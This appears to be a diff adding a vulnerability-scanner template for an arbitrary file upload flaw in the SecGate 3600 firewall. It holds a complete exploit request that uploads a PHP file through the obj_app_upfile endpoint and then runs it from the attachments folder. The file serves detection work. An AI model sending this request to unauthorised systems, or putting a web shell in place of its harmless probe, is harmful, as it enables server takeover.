@@ -1,0 +1,57 @@
+id: secgate-3600-file-upload
+brief:
+    title: SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.
+    label:
+        - secgate
+        - "3600"
+        - firewall
+        - file-upload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/?g=obj_app_upfile'
+      head:
+        Accept: '*/*'
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{string}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+      body: |-
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"
+        Content-Type: text/plain
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundary{{string}}--
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/attachements/{{filename}}.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body
+          need: all
